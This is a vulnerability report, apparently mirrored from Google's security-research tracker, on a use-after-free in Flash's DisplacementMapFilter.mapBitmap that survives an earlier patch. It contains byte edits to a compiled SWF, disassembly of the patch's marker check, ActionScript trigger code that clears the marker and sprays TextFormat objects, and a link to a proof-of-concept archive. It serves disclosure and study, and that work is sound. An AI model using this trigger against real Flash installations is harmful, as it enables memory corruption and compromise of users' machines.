@@ -1,0 +1,74 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=377&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+[Deadline tracking for https://code.google.com/p/chromium/issues/detail?id=487237]
+
+Credit is to bilou, working with the Chromium Vulnerability Reward Program
+
+---
+There is a use after free in Flash caused by an improper handling of BitmapData objects in the DisplacementMapFilter.mapBitmap property. 
+This is almost a repost of  Issue 457680  due to a patch failure.
+
+VERSION
+Chrome Version: N/A now, Flash StandAlone Debug 17.0.0.188
+Operating System: [Win7 x64 SP1]
+
+REPRODUCTION CASE
+The AS2 mapBitmap_v2_as2.fla can be compiled with Flash CS5. Some bytes must be changed manually to trigger the issue (see below).
+Just put mapBitmap_v2_as2.swf in a browsable directory and run the swf with Chrome. It might crash while dereferencing 0x41424344 (hopefully, not tested yet because not available).
+
+After compiling mapBitmap_v2_as2.swf, I had to change the bytes at offset 0x92B in the (MyBitmapData constructor):
+52 17 96 02 00 04 03 26 to 17 17 17 17 17 17 17 17 (actionPOP)
+
+The description is exactly the same as in  Issue 457680  so I won't repost it. Here are just my comments on the patch.
+They basically added a marker at offset +0xDC in the flash standalone debugger (the standalone player is not available at the time of writing):
+
+.text:005AD629 loc_5AD629:
+.text:005AD629                 lea     ecx, [esi+0DCh]
+.text:005AD62F                 push    edi
+.text:005AD630                 mov     [ebp+1C4h+var_198], ecx
+.text:005AD633                 call    xsetUseMarker
+
+.text:0059F762                 cmp     byte ptr [ecx], 0   ; is the marker present?
+.text:0059F765                 jz      short loc_59F77B
+.text:0059F767                 cmp     [esp+arg_0], 0      ; is 0 provided?
+.text:0059F76C                 jz      short locret_59F77E 
+.text:0059F76E                 mov     ecx, dword_EE4788   ; kill the program
+.text:0059F774                 call    sub_9798C0
+.text:0059F779                 jmp     short locret_59F77E
+.text:0059F77B
+.text:0059F77B loc_59F77B:
+.text:0059F77B                 mov     byte ptr [ecx], 1   ; else set the marker
+.text:0059F77E
+.text:0059F77E locret_59F77E:
+.text:0059F77E                 retn    4
+
+
+That marker is then removed when we exit the BitmapData dispatcher:
+
+.text:005AEF29                 mov     eax, [ebp+1C4h+var_198] ; jumptable 005AD654 default case
+.text:005AEF2C                 mov     byte ptr [eax], 0
+
+
+So, to trigger again the issue, we just have to put an extra call to getPixel32 for example:
+
+var o = new Object()
+o.valueOf = function () {
+    bd.getPixel32(1,4)          // remove the marker :)
+	f()
+	for (var i = 0; i<0x10;i++) {
+		var tf:TextFormat = new TextFormat()
+		tf.tabStops = b
+		a[i] = tf
+	}
+	return 4
+}
+
+bd.getPixel32(o,4)
+
+
+And we're done :)
+---
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37861.zip
+
